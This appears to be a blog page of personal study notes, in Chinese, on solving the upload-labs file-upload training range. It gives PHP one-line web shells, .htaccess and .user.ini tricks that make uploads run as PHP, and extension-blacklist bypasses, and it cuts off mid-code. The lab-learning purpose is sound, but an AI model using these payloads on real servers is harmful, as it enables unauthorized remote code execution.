@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="因为这玩意网上wp一找一堆，所以只是自学的笔记&amp;&amp;payload作业，合并成1篇就够了 然后在做题的过程中发现基本能找到的做的过程中好多关卡明明在看了源码后确定就是这个漏洞，却总是上传失败或者上传结果和预期8一样，推测是apache版本的缘故，搞得我很8爽，最后干脆学个姿势就8管了 win11下phpstudy搭建环境，访问localhost时没有响应搭了个upload-labs靶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload_labs刷题&amp;&amp;文件上传漏洞笔记">
+<meta property="og:url" content="http://example.com/2022/03/28/upload-labs%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="因为这玩意网上wp一找一堆，所以只是自学的笔记&amp;&amp;payload作业，合并成1篇就够了 然后在做题的过程中发现基本能找到的做的过程中好多关卡明明在看了源码后确定就是这个漏洞，却总是上传失败或者上传结果和预期8一样，推测是apache版本的缘故，搞得我很8爽，最后干脆学个姿势就8管了 win11下phpstudy搭建环境，访问localhost时没有响应搭了个upload-labs靶">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/upload_labs(1).png">
+<meta property="article:published_time" content="2022-03-28T03:29:34.000Z">
+<meta property="article:modified_time" content="2022-07-17T13:47:54.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/upload_labs(1).png">
+  
+  
+  
+  <title>upload_labs刷题&amp;&amp;文件上传漏洞笔记 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="upload_labs刷题&amp;&amp;文件上传漏洞笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-28 11:29" pubdate>
+          March 28, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">upload_labs刷题&amp;&amp;文件上传漏洞笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>因为这玩意网上wp一找一堆，所以只是自学的笔记&amp;&amp;payload作业，合并成1篇就够了</p>
+<p>然后在做题的过程中发现基本能找到的<br>做的过程中好多关卡明明在看了源码后确定就是这个漏洞，却总是上传失败或者上传结果和预期8一样，推测是apache版本的缘故，搞得我很8爽，最后干脆学个姿势就8管了</p>
+<h1 id="win11下phpstudy搭建环境，访问localhost时没有响应"><a href="#win11下phpstudy搭建环境，访问localhost时没有响应" class="headerlink" title="win11下phpstudy搭建环境，访问localhost时没有响应"></a>win11下phpstudy搭建环境，访问localhost时没有响应</h1><p>搭了个upload-labs靶场进行学习，搭建时遇到了玄学问题，在这里记录一下<br>用phpstyudy搭靶场时遇到了在联想和edge浏览器阔以访问localhost，但在火狐上却无法访问，想了好久没解决，最后rx<del>花了5min就</del>解决了，这里记录一下</p>
+<p>上网查询火狐返回的报错: winspace[request not found]，然后提示应该是winspace这个 <del>8知有求用</del> 的win11新增软件占用了80端口，把它关了就行了</p>
+<p>然而在查询占用了80端口的进程的pid后，却发现该pid并8是winspace，于是就迷了，解决8了。使用了”求援会长”机会*1，然后rx看了几分钟，在任务管理器里找到了winspace进程(1个win11新增的8知有啥鸟用的进程)，关闭，问题解决…..草(主要是一开始我也想是这玩意作妖，结果在占用80端口的pid里没有发现它，就把他排除了…)</p>
+<h1 id="一些payoload作业"><a href="#一些payoload作业" class="headerlink" title="一些payoload作业"></a>一些payoload作业</h1><h2 id="htaccess常见"><a href="#htaccess常见" class="headerlink" title=".htaccess常见"></a>.htaccess常见</h2><p>我就匪夷所思啊，.htaccess在靶场上用就从来没有成功过….(编码问题? 还是? )</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&lt;FilesMatch <span class="hljs-string">&quot;abc&quot;</span> &gt;<br>SetHandler application/x-httpd-php<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br><span class="hljs-string">//</span>意思是将当前目录下文件名为abc的文件都当php解析<br><br>SetHandler application/x-httpd-php<br><span class="hljs-string">//</span>让Apache将其他类型文件均以php格式解析<br><br>AddType application/x-httpd-php <span class="hljs-string">.jpg</span><br><span class="hljs-string">//</span>把<span class="hljs-string">.jpg</span>解析成<span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a? &lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>])&lt;/script&gt;  <span class="hljs-comment">//文件幻术头绕过...</span><br><span class="hljs-comment">/*--------------*/</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//绕过&lt;?，许多命令可以换成这个写法 </span><br></code></pre></td></tr></table></figure>
+<h1 id="pass-01-前端js验证"><a href="#pass-01-前端js验证" class="headerlink" title="pass-01 前端js验证"></a>pass-01 前端js验证</h1><p>首先查看提示: 是前端js检测，于是F12+F1召唤控制台，点击关闭js就行了<br>当然，也可以按其他wp的提示，修改js代码(可以将html代码全复制下来，再修改，打开，然后添加一点action之类)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;     <span class="hljs-comment">//把这行就改一下就阔以啦</span><br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="page-02-Content-Type-MIME验证"><a href="#page-02-Content-Type-MIME验证" class="headerlink" title="page-02 Content-Type(MIME验证)"></a>page-02 Content-Type(MIME验证)</h1><p>1种常见验证，即验证文件类型</p>
+<h2 id="扫盲-MIME"><a href="#扫盲-MIME" class="headerlink" title="扫盲: MIME"></a>扫盲: MIME</h2><p>就是抓包时出现的Content-Type字段，比如这次上传1个.php文件，那发送的请求就是: Content-Type: application&#x2F;octet-stream<br>这里的application&#x2F;octet-stream表示字节流(内容是字节)</p>
+<p>然后有些后端会对Content-Type进行验证，那么只要将其改为允许上传的类型就阔以了(比如: image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif)</p>
+<h2 id="Content-Type抄作业"><a href="#Content-Type抄作业" class="headerlink" title="Content-Type抄作业"></a>Content-Type抄作业</h2><p>常见的媒体格式类型如下：</p>
+<p>text&#x2F;html ： HTML格式<br>text&#x2F;plain ：纯文本格式<br>text&#x2F;xml ： XML格式<br>image&#x2F;gif ：gif图片格式<br>image&#x2F;jpeg ：jpg图片格式<br>image&#x2F;png：png图片格式<br>以application开头的媒体格式类型：</p>
+<p>application&#x2F;xhtml+xml ：XHTML格式<br>application&#x2F;xml： XML数据格式<br>application&#x2F;atom+xml ：Atom XML聚合格式<br>application&#x2F;json： JSON数据格式<br>application&#x2F;pdf：pdf格式<br>application&#x2F;msword ： Word文档格式<br>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）<br>application&#x2F;x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）<br>另外一种常见的媒体格式是上传文件之时使用的：</p>
+<p>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式(比如上传.htaccess)</p>
+<h1 id="page-03-黑名单绕过…"><a href="#page-03-黑名单绕过…" class="headerlink" title="page-03 黑名单绕过…"></a>page-03 黑名单绕过…</h1><p>查看提示: 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>
+<p>ok…..这次试着自己做….<br>先试试大小写: p4yload.pHp，8行<br>再试试%00截断: p4yload.pHp%00.jpg，成功了，但是查看保存的文件名，并8是p4yload.pHp，导致蚁剑没法连，这是为什么呢?<br><img src="/images/%E5%88%B7%E9%A2%98/upload_labs(1).png" srcset="/img/loading.gif" lazyload><br>试着用burp一次次改后缀名:<br>%00: 错<br>0x00: 错<br>.0x00: 错</p>
+<p>??我不理解，但是这后面坑定会讲到，于是先放下</p>
+<p>然后看wp，wp是猜测这阔能是黑名单，于是上传了.php5后缀(还可以是.phtml&#x2F;.phps&#x2F;.pht)<br>但是要想上传后能执行，要在自己的apache的httpd.conf文件写入</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="page-04-hatccess"><a href="#page-04-hatccess" class="headerlink" title="page-04 .hatccess"></a>page-04 .hatccess</h1><p>查看提示: 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p>
+<p>圈这么一堆，那就是黑名单了…<br>(这种时候1个1个试太麻烦，就感觉很有必要写一手自己的脚本了…)</p>
+<p>然后wp的做法是: 利用.hatccess文件，这个文件利用的前提: 在apache的httpd.conf中将LoadModule rewrite_module modules&#x2F;mod_rewrite.so打开(即把对应的注释删除)还有AllowOverride All   实战中遇到没打开的就寄(比如像我这个就没打开，于是显示8出来…)<br>在上传的文件中写这样一句话:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure>
+<p>这样所有的文件就都会被当做php文件解析啦(但是原理8太明白….)<br>或者是: </p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
+<p>(写一个.htaccess文件去把.jpg解析成.php)<br>在传.htaccess的时候可能会遇到MIME验证，抓包随便改一下就行辽，8影响</p>
+<h2 id="AllowOverride参数"><a href="#AllowOverride参数" class="headerlink" title="AllowOverride参数"></a>AllowOverride参数</h2><p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p>
+<h1 id="page-05-user-ini"><a href="#page-05-user-ini" class="headerlink" title="page-05 user.ini"></a>page-05 user.ini</h1><p>查看hint: 上传目录存在php文件（readme.php）<br>查看源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>那么阔以看到，源码里进行了大小写转换，于是这关用大小写绕过是8行的….</p>
+<p>那么根据源码提示，访问 upload&#x2F;readme.php，然后发现这样一句话:<br>该目录是上传文件保存，该文件为系统说明文件，请勿删除！</p>
+<p>思路: 修改read.php文件。<br>那么如何通过上传文件修改readme.php呢?</p>
+<p>上谷歌查，然后发现有个通过.ini文件来绕过的思路: .ini，就是配置文件的一种<br>想引发这个漏洞，有3个条件: 看求8懂，略</p>
+<p>写个payload: </p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">666</span>.jpg<br></code></pre></td></tr></table></figure>
+<p>这句话的意思: 所有的php文件都自动包含666.jpg文件</p>
+<p>然后上传666.jpg，其内容为一句话木马—-<br>然后等待5min(刷新时间)，就阔以用蚁剑连了</p>
+<h1 id="page-06-大小写绕过-后缀名8分大小写"><a href="#page-06-大小写绕过-后缀名8分大小写" class="headerlink" title="page-06 大小写绕过(后缀名8分大小写)"></a>page-06 大小写绕过(后缀名8分大小写)</h1><p>首先，盲注的话，觉得8科学，所以还是要代码审计<br>于是点击查看源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">/ page-<span class="hljs-number">6</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span 